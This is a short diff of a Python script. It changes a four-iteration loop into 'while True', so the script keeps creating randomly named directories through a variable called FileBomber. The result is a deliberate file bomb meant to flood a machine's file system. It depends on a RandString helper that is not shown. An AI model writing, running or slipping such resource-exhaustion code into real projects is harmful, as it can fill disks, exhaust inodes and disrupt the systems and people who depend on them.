@@ -4,8 +4,8 @@ from os import mkdir
 
 # functions org
 
-for i in range(4):
-
+while True:
+    
     FileBomber = RandString('uppercase',5)
 
     mkdir(FileBomber)
